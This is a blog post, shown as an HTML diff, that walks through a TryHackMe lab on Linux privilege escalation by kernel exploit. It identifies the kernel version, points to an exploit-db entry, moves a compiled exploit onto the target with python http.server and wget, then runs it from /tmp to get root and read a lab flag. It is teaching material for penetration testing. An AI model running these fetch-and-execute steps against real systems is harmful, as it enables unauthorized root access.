@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Kernel Exploits - Linux Privilege Escalation - </title><meta name="Description" content="One of the paths to privilege escalation on Linux is a Kernal Exploit. This post will be showcasing how Kernel Exploit works."><meta property="og:title" content="Kernel Exploits - Linux Privilege Escalation" />
+<meta property="og:description" content="One of the paths to privilege escalation on Linux is a Kernal Exploit. This post will be showcasing how Kernel Exploit works." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/linux-privilege-escalation/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-06-23T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-06-23T00:00:00+00:00" /><meta property="og:site_name" content="SecurityNguyen Site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Kernel Exploits - Linux Privilege Escalation"/>
+<meta name="twitter:description" content="One of the paths to privilege escalation on Linux is a Kernal Exploit. This post will be showcasing how Kernel Exploit works."/>
+<meta name="application-name" content="SecurityNguyen">
+<meta name="apple-mobile-web-app-title" content="SecurityNguyen"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/posts/linux-privilege-escalation/" /><link rel="prev" href="/posts/os-detection-and-traceroute/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Kernel Exploits - Linux Privilege Escalation",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/posts\/linux-privilege-escalation\/"
+        },"genre": "posts","keywords": "Red Team, Linux","wordcount":  873 ,
+        "url": "\/posts\/linux-privilege-escalation\/","datePublished": "2023-06-23T00:00:00+00:00","dateModified": "2023-06-23T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Nguyen Nguyen"
+            },"description": "One of the paths to privilege escalation on Linux is a Kernal Exploit. This post will be showcasing how Kernel Exploit works."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">SecurityNguyen</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">SecurityNguyen</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Kernel Exploits - Linux Privilege Escalation</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/tryhardnguyen" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nguyen Nguyen</a></span>&nbsp;<span class="post-category">included in <a href="/categories/penetration-testing/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Penetration Testing</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-06-23">2023-06-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;873 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#the-kernel-exploit-methodology">The Kernel exploit methodology</a></li>
+    <li><a href="#demonstration">Demonstration</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Note: If you need a better view of the image, you can click on the picture and it will zoom in.</p>
+<style>
+	.zoom {
+	            transition: transform 0.3s;
+	            cursor: pointer;
+	        }
+	        
+	        .overlay {
+	            position: fixed;
+	            top: 0;
+	            left: 0;
+	            width: 100%;
+	            height: 100%;
+	            background-color: rgba(0, 0, 0, 0.5);
+	            display: none;
+	            justify-content: center;
+	            align-items: center;
+	            z-index: 999;
+	            pointer-events: none;
+	        }
+	        
+	        .zoomed-image {
+	            max-width: 80%;
+	            max-height: 80%;
+	            transition: transform 0.3s;
+	        }
+	        
+	        .zoomed-image.zoomed {
+	            transform: scale(1.5);
+	        }
+</style>
+<p>This post used the Linux Privilege Escalation Room at TryHackMe for lab.
+<a href="https://tryhackme.com/room/linprivesc" target="_blank" rel="noopener noreffer ">https://tryhackme.com/room/linprivesc</a>
+<br>
+<br>
+Definition of a Kernel: Core component of an operating system that powers and controls the computer system.</p>
+<p>You can think of a Kernel as a Car engine. Car engine is the core component that powers and controls the entire vehicle.</p>
+<p>When you successfully control the kernel that mean you have root privilege meaning you can do anything you want.</p>
+<h2 id="the-kernel-exploit-methodology">The Kernel exploit methodology</h2>
+<ol>
+<li><strong>Identify</strong> the <strong>kernel version</strong></li>
+<li><strong>Search and find an exploit code</strong> for the <strong>kernel version of the target system</strong></li>
+<li><strong>Run the exploit</strong></li>
+</ol>
+<p>Please be aware that a failed kernel exploit can lead to a system failure/crash.</p>
+<p>To find exploit code, you can google the kernel version of your system and add exploit at the end.
+Furthermore, you can check exploit-db to see if there has been any publication of vulnerabilities for that kernel version.
+Additional Resource: <a href="https://www.linuxkernelcves.com/cves" target="_blank" rel="noopener noreffer ">https://www.linuxkernelcves.com/cves</a>
+<br>
+<br>
+Here are some hints/notes from TryHackMe:<br>
+&ldquo;<strong>Hints/Notes:</strong></p>
+<ol>
+<li>
+<p><strong>Being too specific about the kernel version</strong> when <strong>searching for exploits on Google, Exploit-db, or searchsploit</strong></p>
+</li>
+<li>
+<p>Be sure you <strong>understand how the exploit code works BEFORE you launch it.</strong></p>
+<p>Some <strong>exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later.</strong></p>
+<p>Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.</p>
+</li>
+<li>
+<p>Some exploits may <strong>require further interaction once they are run</strong>. <strong>Read all comments and instructions provided with the exploit code.</strong></p>
+</li>
+<li>
+<p>You can <strong>transfer the exploit code from your machine to the target system</strong> using the <strong><code>SimpleHTTPServer</code> Python module and <code>wget</code> respectively.</strong>&rdquo;</p>
+</li>
+</ol>
+<h2 id="demonstration">Demonstration</h2>
+<p>This is all done in the TryHackMe lab that are provided to the user.
+<br>
+<br>
+In this Kernel Exploits Lab, TryHackMe has provided us the username and password of the victim machine. The problem is that this user has low-privilege. Our job is to gain root access using kernel exploit. Let&rsquo;s begin.</p>
+<p>The first thing we need to do is identify the kernel version this operating system is running on. To do this, we can use multiple command that will return us the same result:
+<code>uname -a</code>,<code>cat /proc/version</code></p>
+<img class="zoom" src="/images/linux_priv_1.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_1.png">
+</div>
+<p>Here is a screenshot of the privilege that the user currently has.
+<img class="zoom" src="/images/linux_priv_2.png"></p>
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_2.png">
+</div>
+Kernel version: `Linux 3.13.0-24-generic`
+<br>
+<br>
+The next step is to look up the kernel version and see if there is any exploits that correspond to that kernel.
+This is what I found: https://www.exploit-db.com/exploits/37293
+<p>Now, I will download the exploit onto my attacker box and compile the code.</p>
+<img class="zoom" src="/images/linux_priv_3.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_3.png">
+</div>
+<p>Now, I will transfer my malicious program to my victim machine. One method of doing this is by using wget and python http server.
+<br>
+<br>
+To start the http server: python -m http.server port number</p>
+<p>A problem suddenly pop up.  It look like the current directory that I am in (/)-which is root doesn&rsquo;t allow file to be written to. That mean we have to find another directory to download our malicious program.</p>
+<img class="zoom" src="/images/linux_priv_4.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_4.png">
+</div>
+<p>The next step we can do is using the command: <code>ls -al</code>
+<br>
+<br>
+This command allow us to look at the permission given to each directory. The current directory we are in is &ldquo;/&rdquo; which is root. The privilege that is present is: <code>drwx------</code></p>
+<img class="zoom" src="/images/linux_priv_5.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_5.png">
+</div>
+<br>
+Let break it down:
+<br>
+d =  Stand for directory.
+<p>Then we split it into groups. Each group have 3 item.
+<br>
+For example: <code>|rwx|---|---|</code>
+<br>
+The <strong>first group</strong> is <strong>owner</strong>, The <strong>second group</strong> is <strong>group</strong>, The <strong>third group</strong> is <strong>others</strong> (everyone else).
+<br>
+The <strong>owner (root)</strong> has <strong>read, write, execute</strong>, the <strong>group doesn&rsquo;t have any privilege</strong> and <strong>same goes for others.</strong> That why I couldn&rsquo;t download the exploit to the target machine in that directory. I fall into the others category because my account is karen.
+<br>
+Knowing this information, we need to find an directory that allow us to write to the directory. Let&rsquo;s go back to the picture.</p>
+<img class="zoom" src="/images/linux_priv_5.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_5.png">
+</div>
+<br>
+The directory /tmp caught my eyes. We can read, write, execute on the directory. That the directory we are going to use. To download the malicious file, I am going execute this command: 
+<br>
+`wget http://target_ip:port/item_to_download`
+<br>
+But first I have to change the directory to /tmp
+<img class="zoom" src="/images/linux_priv_6.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_6.png">
+</div>
+<br>
+Now, let change the permission on the malicious program so that it can execute.
+`chmod +x malicious_program
+<br>
+Then run it using `./word`
+<br>
+After running the malicious program, I will run id to check if I got root access.
+<img class="zoom" src="/images/linux_priv_7.png">
+<div class="overlay">
+        <img class="zoomed-image" src="/images/linux_priv_7.png">
+</div>
+<br>
+After that, I have to find the file, flag1.txt. To find this file, I will run the following command: `find / -name flag1.txt`
+<br>
+<br>
+What this command does is it start from root and make it way down searching for flag1.txt and give the location of where the file is located at. The file is at: `/home/matt/flag1.txt`. Now, all I have to do is run a cat command: `cat /home/matt/flag1.txt` and I should have the flag.
+<br>
+<br>
+Flag: `THM-28392872729920`
+<br>
+<br>
+Important lesson:
+<br>
+- When transferring the exploit to the victim machine, make sure the directory you're downloading (writing) to allow you to have write permission and additionally allow you to execute the malicious program.
+<br>
+That is all for my post. Thanks for reading.
+<!-- Zoom Animation Feature -->
+<script>
+	const zooms = document.querySelectorAll('.zoom');
+	const overlay = document.querySelector('.overlay');
+	const zoomedImage = document.querySelector('.zoomed-image');
+<pre><code>zooms.forEach(function(zoom) {
+	zoom.addEventListener('click', function() {
+		overlay.style.display = 'flex';
+		overlay.style.pointerEvents = 'auto';
+		zoomedImage.src = zoom.src;
+		zoomedImage.classList.add('zoomed');
+	});
+});
+
+overlay.addEventListener('click', function() {
+	overlay.style.display = 'none';
+	overlay.style.pointerEvents = 'none';
+	zoomedImage.classList.remove('zoomed');
+});
+</code></pre>
+<p></script></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-06-23</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/linux-privilege-escalation/" data-title="Kernel Exploits - Linux Privilege Escalation" data-hashtags="Red Team,Linux"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/posts/linux-privilege-escalation/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/red-team/">Red Team</a>,&nbsp;<a href="/tags/linux/">Linux</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/os-detection-and-traceroute/" class="prev" rel="prev" title="OS Detection/Traceroute"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>OS Detection/Traceroute</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/tryhardnguyen" target="_blank">Nguyen Nguyen</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@14.0.2/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
